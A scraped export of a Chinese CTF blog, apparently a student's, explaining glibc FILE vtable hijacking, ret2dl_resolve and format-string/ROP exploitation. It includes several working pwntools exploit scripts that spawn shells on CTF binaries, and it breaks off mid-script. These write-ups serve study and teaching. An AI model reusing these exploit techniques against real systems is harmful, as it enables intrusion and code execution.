我不明白还有什么方法能够挽救我们学校，挽救这个团队。一群没有能力，没有天赋，没有资源，没有创造力与激情的人组成的团队能走多远。我真的很羡慕那些有着可以并肩作战的队友的人，在你困难的时候可以给你鼓励，有勇气知难而上。我们可以一起研究一个问题到深夜，可以一起怼一道题目到把Google前十页的方法都试一遍，一个有技术氛围的团队，能够分享的团队，是1+1&gt;2的。 志不同，道不合。 0x01即使对队友有千万的不满，也没办法掩盖自己不够努力的实事。 蓝莲花的队伍一年时间就拿到了DEFCON入围资格，打出了全球19名的成绩。40个月60场拼尽全力的比赛。一场比赛至少一天是通宵的。我原本以为自己已经够努力了，但，无论是和大佬们，还是和他校选手比较，真的还差太多。 大二了，当初给自己定的目标也完成了大概。但依旧一无所成。 0x02我已经快放弃我们队伍了。大佬们自生自灭吧，带不动。 0x03没办法，资源太少了，未来还是会读研的吧。也不再为高考找借口了，只是4年差距太难弥补了，尽力吧。 0x04总的来说，第一次参加线下赛，玩的还是蛮开心的，但是一直被打并不觉得很爽= =。。。 真是蛋疼的生活啊。。。","tags":[{"name":"life","slug":"life","permalink":"http://reehy.top/tags/life/"}]},{"title":"Pwn的FILE结构体","date":"2017-04-14T02:27:39.000Z","path":"2017/04/14/Pwn的FILE结构体/","text":"前言神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的编辑器坑啊。。(╯‵□′)╯︵┻━┻(╯‵□′)╯︵┻━┻(╯‵□′)╯︵┻━┻好了回到FILE结构体这个问题上来。由于两次碰见这个东西了，意识到似乎比赛中开始多了起来，于是趁热学习下，提高自己的姿势水平。 FILE结构体首先我们知道linux中遵循“所有接口皆文件”的原则，输入输出做成了文件的形式。 以下所有关键词搜索命令为grep -rn &quot;struct _IO_FILE {&quot; --include=&quot;*.h&quot; /usr/include 其中_IO_2_1_stdout_的结构体如下： glibc-2.24/libio/libio.h123extern struct _IO_FILE_plus _IO_2_1_stdin_;extern struct _IO_FILE_plus _IO_2_1_stdout_;extern struct _IO_FILE_plus _IO_2_1_stderr_; 我们查看_IO_FILE_plus的结构体定义/root/desktop/glibc-2.24/libio/libioP.h12345678910/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; 这里也解释了之所以下面加上函数指针，做成类似虚表的形式，是为了与C++的流兼容。 下面来查看两个关键结构_IO_FILE和_IO_jump_t：_IO_FILE在/usr/include/libio.h中123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; _IO_jump_t在/root/desktop/glibc-2.24/libio/fileops.c中1234567891011121314151617181920212223const struct _IO_jump_t _IO_file_jumps libio_vtable =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 再结合gdb查看内存能够得到更直观的理解：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647wndbg&gt; telescope 0xf771fd60 4000:0000│ 0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad288701:0004│ 0xf771fd64 (_IO_2_1_stdout_+4) —▸ 0xf771fda7 (_IO_2_1_stdout_+71) ◂— 0x7208700a... ↓08:0020│ 0xf771fd80 (_IO_2_1_stdout_+32) —▸ 0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x009:0024│ 0xf771fd84 (_IO_2_1_stdout_+36) ◂— 0x0... ↓0d:0034│ 0xf771fd94 (_IO_2_1_stdout_+52) —▸ 0xf771f5a0 (_IO_2_1_stdin_) ◂— 0xfbad208b0e:0038│ 0xf771fd98 (_IO_2_1_stdout_+56) ◂— 0x10f:003c│ 0xf771fd9c (_IO_2_1_stdout_+60) ◂— 0x010:0040│ 0xf771fda0 (_IO_2_1_stdout_+64) ◂— 0xffffffff11:0044│ 0xf771fda4 (_IO_2_1_stdout_+68) ◂— 0xa00000012:0048│ 0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x013:004c│ 0xf771fdac (_IO_2_1_stdout_+76) ◂— 0xffffffff... ↓15:0054│ 0xf771fdb4 (_IO_2_1_stdout_+84) ◂— 0x016:0058│ 0xf771fdb8 (_IO_2_1_stdout_+88) —▸ 0xf771f4e0 ◂— 0x017:005c│ 0xf771fdbc (_IO_2_1_stdout_+92) ◂— 0x0... ↓1a:0068│ 0xf771fdc8 (_IO_2_1_stdout_+104) ◂— 0xffffffff1b:006c│ 0xf771fdcc (_IO_2_1_stdout_+108) ◂— 0x0... ↓25:0094│ 0xf771fdf4 (_IO_2_1_stdout_+148) —▸ 0xf771d960 (_IO_file_jumps) ◂— 0x026:0098│ 0xf771fdf8 (stderr) —▸ 0xf771fcc0 (_IO_2_1_stderr_) ◂— 0xfbad208727:009c│ 0xf771fdfc (stdout) —▸ 0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad2887pwndbg&gt; telescope 0xf771d960 3000:0000│ 0xf771d960 (_IO_file_jumps) ◂— 0x0... ↓02:0008│ 0xf771d968 (_IO_file_jumps+8) —▸ 0xf75d6040 (_IO_file_finish) ◂— push edi03:000c│ 0xf771d96c (_IO_file_jumps+12) —▸ 0xf75d6b00 (_IO_file_overflow) ◂— push ebp04:0010│ 0xf771d970 (_IO_file_jumps+16) —▸ 0xf75d6810 (_IO_file_underflow) ◂— push ebp05:0014│ 0xf771d974 (_IO_file_jumps+20) —▸ 0xf75d7a40 (_IO_default_uflow) ◂— push esi06:0018│ 0xf771d978 (_IO_file_jumps+24) —▸ 0xf75d8b50 (_IO_default_pbackfail) ◂— push ebp07:001c│ 0xf771d97c (_IO_file_jumps+28) —▸ 0xf75d5c50 (_IO_file_xsputn) ◂— push ebp08:0020│ 0xf771d980 (_IO_file_jumps+32) —▸ 0xf75d5790 ◂— push ebp09:0024│ 0xf771d984 (_IO_file_jumps+36) —▸ 0xf75d4730 (_IO_file_seekoff) ◂— push ebp0a:0028│ 0xf771d988 (_IO_file_jumps+40) —▸ 0xf75d7dd0 ◂— push ebp0b:002c│ 0xf771d98c (_IO_file_jumps+44) —▸ 0xf75d44b0 (_IO_file_setbuf) ◂— push esi0c:0030│ 0xf771d990 (_IO_file_jumps+48) —▸ 0xf75d4300 (_IO_file_sync) ◂— push ebp0d:0034│ 0xf771d994 (_IO_file_jumps+52) —▸ 0xf75c93b0 (_IO_file_doallocate) ◂— push ebp0e:0038│ 0xf771d998 (_IO_file_jumps+56) —▸ 0xf75d5c00 (_IO_file_read) ◂— push esi0f:003c│ 0xf771d99c (_IO_file_jumps+60) —▸ 0xf75d55b0 (_IO_file_write) ◂— push ebp10:0040│ 0xf771d9a0 (_IO_file_jumps+64) —▸ 0xf75d5210 (_IO_file_seek) ◂— push ebx11:0044│ 0xf771d9a4 (_IO_file_jumps+68) —▸ 0xf75d4480 (_IO_file_close) ◂— push ebx12:0048│ 0xf771d9a8 (_IO_file_jumps+72) —▸ 0xf75d5590 (_IO_file_stat) ◂— sub esp, 0x1013:004c│ 0xf771d9ac (_IO_file_jumps+76) —▸ 0xf75d8ce0 ◂— mov eax, 0xffffffff14:0050│ 0xf771d9b0 (_IO_file_jumps+80) —▸ 0xf75d8cf0 ◂— ret 利用原理我们平时调用文件族的函数的时候（包括一些输入输出），最后都会通过虚表来调用函数，如果我们可以通过修改signed char _vtable_offset使其指向一个我们伪造的虚表，那么我们就可以控制eip。 利用思路： 控制_IO_FILE_plus或_IO_FILE结构体的signed char _vtable_offset偏移使其指向我们伪造的虚表。 伪造虚表中函数为我们希望程序调用的函数如system 利用条件： 可泄露libc基址 有一次任意地址写的机会 存在一个我们知道地址的可控区域 例题下面用20170ctf的Easyprintf来为例分析 程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的_IO_2_1_stdout_结构的虚表，因为printf在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为system，而这个结构自身会作为参数传入，覆盖虚表之后将一个sh\\0\\0写到整个结构头部即可。 先放上没什么卵用但是应该是对的并且学到了东西的exp。。。。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1local = 1debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./EasiestPrintf')else: p = remote()if local and debug: gdb.attach(p, open('debug'))elf = ELF('./EasiestPrintf')libc = ELF('/lib32/libc.so.6')bss_addr = elf.bss_IO_stdout_got = 0x0804A044'''def exe_fmt(payload): p = process('./EasiestPrintf') p.recvuntil('read:\\n') p.sendline(str(_IO_stdout_addr)) p.recvuntil('Good Bye\\n') p.sendline(payload) return p.recvall()'''def pwn(): p.recvuntil('read:\\n') p.sendline(str(_IO_stdout_got)) _IO_stdout_addr = int(p.recvline(), 16) p.recvline('Good Bye\\n') print '_IO_stdout_addr =&gt; ', hex(_IO_stdout_addr) libc.address = _IO_stdout_addr - libc.symbols['_IO_2_1_stdout_'] system_addr = libc.symbols['system'] print 'system_addr =&gt; ', hex(system_addr) _IO_file_jumps_addr = libc.symbols['_IO_file_jumps'] print '_IO_file_jumps =&gt; ', hex(libc.symbols['_IO_file_jumps'])# gdb.attach(p, open('debug')) def exe_fmt(payload): p = process('./EasiestPrintf') p.recvuntil('read:\\n') p.sendline(str(_IO_stdout_got)) p.recvuntil('Good Bye\\n') p.sendline(payload) return p.recvall() fmt = FmtStr(exe_fmt) # init # _IO_stdout_addr = 'sh\\x00\\x00' # _IO_stdout_addr - 4 = &amp;system # _IO_stdout_vtable+0x1c = &amp;(libc_stdout-4) _IO_file_xsputn writes = &#123;_IO_stdout_addr:26739-16, # 'sh\\x00\\x00' _IO_stdout_addr-4:system_addr, _IO_file_jumps_addr+0x1c:_IO_stdout_addr-4&#125; payload = fmtstr_payload(fmt.offset, writes, 0, 'byte') p.sendline(payload) if __name__ == '__main__': pwn() p.interactive() 最后的payload使180长度，但是最大长度是158- -。。 关于FmtStrpwntools中的fmtstr还是很有趣的，唯一的不足就是生成的payload太长了- -因为据观察完全是用hhn来修改的（因为只能指定一个只能为hhnorhnorn中的一种来生成payload），大概是作者懒了没想设计别的算法把- - 先看下给出的example12345678910111213141516171819202122232425262728293031323334353637383940414243&gt;&gt;&gt; program = tempfile.mktemp()&gt;&gt;&gt; source = program + \".c\"&gt;&gt;&gt; write(source, '''... #include &lt;stdio.h&gt;... #include &lt;stdlib.h&gt;... #include &lt;unistd.h&gt;... #include &lt;sys/mman.h&gt;... #define MEMORY_ADDRESS ((void*)0x11111000)... #define MEMORY_SIZE 1024... #define TARGET ((int *) 0x11111110)... int main(int argc, char const *argv[])... &#123;... char buff[1024];... void *ptr = NULL;... int *my_var = TARGET;... ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);... if(ptr != MEMORY_ADDRESS)... &#123;... perror(\"mmap\");... return EXIT_FAILURE;... &#125;... *my_var = 0x41414141;... write(1, &amp;my_var, sizeof(int *));... scanf(\"%s\", buff);... dprintf(2, buff);... write(1, my_var, sizeof(int));... return 0;... &#125;''')&gt;&gt;&gt; cmdline = [\"gcc\", source, \"-Wno-format-security\", \"-m32\", \"-o\", program]&gt;&gt;&gt; process(cmdline).wait_for_close()&gt;&gt;&gt; def exec_fmt(payload):... p = process(program)... p.sendline(payload)... return p.recvall()...&gt;&gt;&gt; autofmt = FmtStr(exec_fmt)&gt;&gt;&gt; offset = autofmt.offset&gt;&gt;&gt; p = process(program, stderr=PIPE)&gt;&gt;&gt; addr = unpack(p.recv(4))&gt;&gt;&gt; payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)&gt;&gt;&gt; p.sendline(payload)&gt;&gt;&gt; print hex(unpack(p.recv(4)))0x1337babe 主要就是一个类，一个函数：class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;) → str 其中上面的那个类可以用来完成fsb的所有操作，下面那个方法主要是用来产生payload用。 execute_fmt 一个存在fsb的process，我们通过这个process的交互过程来得到fsb的一些基本信息 offset 偏移，没有给出的话会通过栈泄露自动给出 padlen payload之前填充的字符数 numbwritem 生成的此payload（包括填充）之前的偏移量 看了看源码，发现成员名和参数名是同名的，直接调用即可。我们其实可以主要用这个来得到FmtStr.offset即可。实例化一个类后，通过write(addr, data)来控制想要修改的地址和数据，可以通过一个字典来传参（data(int)）。最后通过execute_writes()方法来调用fmtstr_payload生成payload并发送出去。 我们也可以直接调用fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)这个方法来只生成payload。给下参数，没啥特别的 offset (int) – the first formatter’s offset you control writes (dict) – dict with addr, value {addr: value, addr2: value2} numbwritten (int) – number of byte already written by the printf function write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"FILE","slug":"FILE","permalink":"http://reehy.top/tags/FILE/"}]},{"title":"瓜皮的日常吐槽","date":"2017-04-13T02:13:06.000Z","path":"2017/04/13/瓜皮的日常吐槽/","text":"诶诶诶，我说。我的运维怎么这么烂啊，自己的博客和服务器用用也不知道是哪里的内存泄漏了，开机35%，跑个几星期就70%。。。随便一看还能发现一堆zombia process，杀都杀不死，必须得重启。。。hexo的启动慢的要死，要等个好几秒。。 还有那个老博客，我都不敢看，惨不忍睹，就跑了个wordpress啊。 奥还跑了个shadowsocks的server。。 啥时候把那个博客关了，换个专门的shadowsocks，还能租出去，省得每个月吃我口粮钱v(｡･ω･｡)","tags":[{"name":"life","slug":"life","permalink":"http://reehy.top/tags/life/"}]},{"title":"ret_2_dl_resolve","date":"2017-04-12T07:12:06.000Z","path":"2017/04/12/ret-2-dl-resolve/","text":"前言最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy binding就不难理解。 利用方式 控制EIP为PLT[0]的地址，只需传递一个index_arg参数 控制index_arg的大小，使reloc的位置落在可控地址内 伪造reloc的内容，使sym落在可控地址内 伪造sym的内容，使name落在可控地址内 伪造name为任意库函数，如system 所以我们得出结论，我们最终要伪造三个节信息，分别是.rel.plt, .dynsym, .dynstr，并且在dynstr上布置我们希望调用的函数的str，比如system。并且我们要通过控制index_args参数和eip指针是的程序按照我们的设计来调用函数。 Example以2017hbctf第一场的pwn200来分析 程序逻辑123456789int __cdecl main()&#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); read_buf(); fflush(stdout); return 0;&#125; 123456ssize_t read_buf()&#123; char buf; // [sp+6h] [bp-12h]@1 return read(0, &amp;buf, 0x3Cu);&#125; checksec1234567root@kali ~/c/2/p/infoless# checksec infoless [*] '/root/ctf-problem/2017hbctf/pwn/infoless/infoless' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 除此之外就没有信息了，所以这题考察的就是如何在缺少信息的情况下getshell，这里用到的一种技术就是ret_2_dl_resolve。 关于.dynamic：12345678910111213141516171819202122232425262728root@kali ~/c/2/p/infoless# readelf -d infoless Dynamic section at offset 0x70c contains 24 entries: 标记 类型 名称/值 0x00000001 (NEEDED) 共享库：[libc.so.6] 0x0000000c (INIT) 0x8048340 0x0000000d (FINI) 0x80485c4 0x00000019 (INIT_ARRAY) 0x8049700 0x0000001b (INIT_ARRAYSZ) 4 (bytes) 0x0000001a (FINI_ARRAY) 0x8049704 0x0000001c (FINI_ARRAYSZ) 4 (bytes) 0x6ffffef5 (GNU_HASH) 0x804818c 0x00000005 (STRTAB) 0x804825c 0x00000006 (SYMTAB) 0x80481bc 0x0000000a (STRSZ) 109 (bytes) 0x0000000b (SYMENT) 16 (bytes) 0x00000015 (DEBUG) 0x0 0x00000003 (PLTGOT) 0x80497f8 0x00000002 (PLTRELSZ) 32 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x8048320 0x00000011 (REL) 0x8048300 0x00000012 (RELSZ) 32 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffe (VERNEED) 0x80482e0 0x6fffffff (VERNEEDNUM) 1 0x6ffffff0 (VERSYM) 0x80482ca 0x00000000 (NULL) 0x0 ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。 通过半天多的努力终于算是理解掌握了ret_to_dl_resolve的利用方法。。正如如上所说，这里的关键点是理解linux的lazy binding的工作方式，由于要伪造三个节信息并且完全计算偏移，所以我认为不熟练的话还是需要花时间调试offset的。但是我看了别人的解法后发现了一个问题，那就是似乎.dynamic节似乎是可写的，那么我们似乎可以通过修改.dynamic的偏移信息使得直接定位.dynstr的地址到我们伪造的.dynstr(bss)上了。 参考exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/usr/bin/python# -*- coding:utf-8 -*- from pwn import *from time import * vulFunAddr = 0x080484CBreadpltAddr = 0x08048380fflushpltAddr = 0x08048390dynstrInDynamicAddr = 0x08049750bssAddr = 0x08049820 strTable = ['', 'libc.so.6','_IO_stdin_used', 'fflush', 'stdin', 'read', 'stdout', 'stderr', 'setvbuf','__libc_start_main', '__gmon_start__', 'GLIBC_2.0', '']strTable[3] = 'system'#将伪造的dynstr表中的fflush函数给换成systembinShellStr = '/bin/sh\\0'expOffset = 22payloadHead = 'a'*expOffset def writeStrTableToBSS(baseAddr): tempBSS = baseAddr #循环写入伪造的dynstr表 for i in strTable: str = i + chr(0) payloadTemp = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(0)+ p32(tempBSS) + p32(len(str)+1) p.send(payloadTemp) sleep(0.1) p.send(str) tempBSS = tempBSS + len(str) sleep(0.1) p = remote('123.206.81.66', 8888)#p = remote('127.0.0.1', 8888)#p = process('./infoless')context.log_level = 'debug' #step 1: 将binShStr写入可写的bss段中payload1 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(bssAddr) + p32(8)p.send(payload1)sleep(0.1)p.send(binShellStr)sleep(0.1) #step 2: 将伪造的dynstr表写入binShStr后面dynstrInBSSAddr = bssAddr +len(binShellStr) + 4writeStrTableToBSS(dynstrInBSSAddr) #step 3: 将伪造的dynstr表地址写入dynamic中相对应的索引地址payload2 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(dynstrInDynamicAddr) + p32(4)p.send(payload2)sleep(0.1)p.send(p32(dynstrInBSSAddr))sleep(0.1) #step 4：getshellpayload3 = payloadHead + p32(fflushpltAddr)+ p32(vulFunAddr) + p32(bssAddr)p.send(payload3)sleep(0.1)p.interactive() 思考于是我有了一个想法，既然.dynamic节是可写的，那么.dynstr节是否可写呢？其他的节是否还存在可写的呢，节是否可写是否有标志位给出呢？于是我进行了以下的测试。 测试.dynstr节是否可写exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1local = 1debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./infoless')else: p = remote()if local and debug: gdb.attach(p, open('debug'))offset = 22elf = ELF('./infoless')read_plt = elf.symbols['read']vuln_addr = 0x80484CBbss_addr = 0x8049820fflush_plt = elf.symbols['fflush']def pwn(): addr = bss_addr payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100) p.sendline(payload1) payload2 = '/bin/sh\\x00'.ljust(20, 'a') p.sendline(payload2) addr = 0x8048276 gdb,attach(p) payload1 = offset * 'b' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100) p.sendline(payload1) payload2 = 'system\\x00' p.sendline(payload2) payload1 = 14 * 'c' + p32(fflush_plt) + p32(0) + p32(bss_addr) p.sendline(payload1)if __name__ == '__main__': pwn() p.interactive() 嗯，测试结果不可写= =，但是当我们尝试去写的时候似乎不会报错？（应该是有一个address fault的呀- -）。 节的权限通过gdb的vmmap可以得到权限。当ELF文件被加载到内存中后，系统会将多个具有相同权限Section(节)合并成一个Segment(段)，通常为代码段(可读可执行)，可读可写的数据段，和只读数据段。 12345678910111213141516wndbg&gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000 0x8049000 r-xp 1000 0 /root/ctf-problem/2017hbctf/pwn/infoless/infoless 0x8049000 0x804a000 rw-p 1000 0 /root/ctf-problem/2017hbctf/pwn/infoless/infoless0xf7dfa000 0xf7dfc000 rw-p 2000 0 0xf7dfc000 0xf7fad000 r-xp 1b1000 0 /lib32/libc-2.24.so0xf7fad000 0xf7faf000 r--p 2000 1b0000 /lib32/libc-2.24.so0xf7faf000 0xf7fb0000 rw-p 1000 1b2000 /lib32/libc-2.24.so0xf7fb0000 0xf7fb3000 rw-p 3000 0 0xf7fd2000 0xf7fd4000 rw-p 2000 0 0xf7fd4000 0xf7fd7000 r--p 3000 0 [vvar]0xf7fd7000 0xf7fd9000 r-xp 2000 0 [vdso]0xf7fd9000 0xf7ffb000 r-xp 22000 0 /lib32/ld-2.24.so0xf7ffc000 0xf7ffd000 r--p 1000 22000 /lib32/ld-2.24.so0xf7ffd000 0xf7ffe000 rw-p 1000 23000 /lib32/ld-2.24.so0xfffdd000 0xffffe000 rw-p 21000 0 [stack] 关于传参我的一个失败的exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1local = 1debug = 0global pif slog: context(log_level = 'debug')if local: p = process('./infoless')else: p = remote()if local and debug: gdb.attach(p, open('debug'))elf = ELF('./infoless')offset = 22# .rel.plt reloc = reloc + .rel.plt , fake reloc_args to locate reloc on bss# .dynsym sym = .dynsym + reloc-&gt;info , fake reloc-&gt;info to locate sym on bss# .dynstr name = .dynstr + sym-&gt;value, fake sym-&gt;value to locate name on bss# name_str fake name_str on bsspr = 0x08048361relplt_addr = 0x8048320vuln_addr = 0x80484CBplt_addr = 0x8048370bss_addr = 0x8049820dynsym_addr = 0x80481bcdynstr_addr = 0x0804825cread_plt = elf.symbols['read']def pwn(): print 'bss_addr =&gt; ', hex(bss_addr) # send /bin/sh addr = bss_addr payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100) p.sendline(payload1) payload2 = '/bin/sh\\x00'.ljust(20, 'a') p.sendline(payload2) # fake .rel.plt on bss # 0x0804970c 0x00000107 addr += len(payload2) payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)# gdb.attach(p, open('debug')) p.sendline(payload1) print 'addr - relplt_addr =&gt; ', hex(addr - relplt_addr) off = ((addr - dynsym_addr) / 0x10 + 1) * 0x100 + 0x7 print 'off =&gt; ', hex(off) payload2 = p32(elf.got['fflush']) + p32(off) p.sendline(payload2)# gdb.attach(p) # fake .dynsym on bss # 0x0000001a 0x00000000 0x00000000 0x00000012 addr += len(payload2) payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100) p.sendline(payload1) off = addr - dynstr_addr + 0x10 print 'offset_dynstr =&gt; ', hex(off) # 15f0 payload2 = p32(off) + p32(0) + p32(0) + p32(0x12)# gdb.attach(p, open('debug')) p.sendline(payload2) # fake .dynstr addr += len(payload2) payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100) p.sendline(payload1)# gdb.attach(p, open('debug')) payload2 = 'system\\x00' p.sendline(payload2)# gdb.attach(p, open('debug')) # fake reloc_args &amp; mov eip, plt[0] reloc_args = bss_addr - relplt_addr + 0x14 print 'reloc_args =&gt; ', hex(reloc_args) gdb.attach(p, open('debug')) payload1 = offset * 'a' + p32(plt_addr) + p32(reloc_args) + p32(elf.plt['fflush']) + p32(vuln_addr) + p32(bss_addr) p.sendline(payload1)# gdb.attach(p)if __name__ == '__main__': pwn() p.interactive() 最后在控制eip到plt[0]的位置时，我遇到了传参的问题，当我将reloc_adgs压入栈中后，我无法将将要调用函数fflush()(事实上是systm())的参数/bin/sh\\x00压入栈中了，这里可能需要用到rop去控制esp和栈的内容，暂时先不去研究这个。 其他可能的利用？当我们可以控制.dynamic后是否可以改变别的值去控制程序（连接器？）解析到其他的地址上，是否还有其他的利用方式？ x64关于64位的利用方式应该是差不多的，暂时没精力研究了，先挖坑，以后填吧，先去研究沙盒了。 叹还是太菜了，弄明白个这个玩意都要花接近一天。。。。TAT","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"stack","slug":"stack","permalink":"http://reehy.top/tags/stack/"},{"name":"ret2dlresolve","slug":"ret2dlresolve","permalink":"http://reehy.top/tags/ret2dlresolve/"}]},{"title":"Pwn中的沙盒","date":"2017-04-11T05:38:09.000Z","path":"2017/04/11/Pwn中的沙盒/","text":"什么是沙盒来来来，开个坑，以后慢慢填","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"sandbox","slug":"sandbox","permalink":"http://reehy.top/tags/sandbox/"}]},{"title":"2017.4.8Pwn","date":"2017-04-10T23:28:28.000Z","path":"2017/04/11/2017-4-8Pwn-1/","text":"前言简单的一些线下赛的pwn题吧，可能因为线下赛时间短，所以题目没有特别变态的，简单记录，还是学到了不少东西的。 ropprintf两个洞，栈溢出和fsb，稍加利用即可。这里主要是存在64位的问题，64位的的传参顺序是先用六个寄存器，然后才到栈上存数据。所以%7$lx才会打印出栈上的数据；同时x与lx的区别，分别是4byte与8byte长度。相同的还有n这个格式化符号，n是写到对应内存的4个byte里，ln是写到对应内存的8byte里。 然后还要注意，不同机器上的libc可能不一样，同时大多数都是以0对齐的，所以可能需要猜一猜。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1local = 1debug = 0if slog: context(log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])if local: p = process('./ropprintf') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('172.16.1.1', 20000) libc = ELF('./libc.so.6')#if local and debug:# gdb.attach(p, open('debug'))elf = ELF('./ropprintf')offset = 22printf_got = elf.got['printf']payload1 = '%11$lx'pop_ret = 0x0000000000400703 # pop rdi, retp.recvuntil('something\\n')gdb.attach(p)p.sendline(payload1)libc_start_main_addr = int(p.recvline(), 16)print 'libc_start =&gt; ', hex(libc_start_main_addr)libc.address = libc_start_main_addr - 240 - libc.symbols['__libc_start_main']system_addr = libc.symbols['system']print 'system_addr =&gt; ', hex(system_addr)binsh_addr = libc.search('/bin/sh').next()for i in range(8): p.recvuntil('something\\n') p.sendline('1')# gdb.attach(p)payload2 = 'a' * offset + p64(pop_ret) + p64(binsh_addr) + p64(system_addr)p.sendline(payload2)p.interactive() easyprintf最直接的fsb。程序开了PIE，可以通过直接打印得到elf.address和libc.address。由于传参方式不一样，所以能用传统的方式去写，这里我是用的UAF，因为我们可以控制栈上的内容，所以可以提前将想要写入的地址布置在栈上，然后再用fsb的hhn和hn分字节去修改。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1local = 1debug = 0if slog: context(log_level = 'debug', terminal = ['tmux','splitw', '-h'])if local: p = process('./easyprintf')else: p = remote()if local and debug: gdb.attach(p)elf = ELF('./easyprintf')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')# 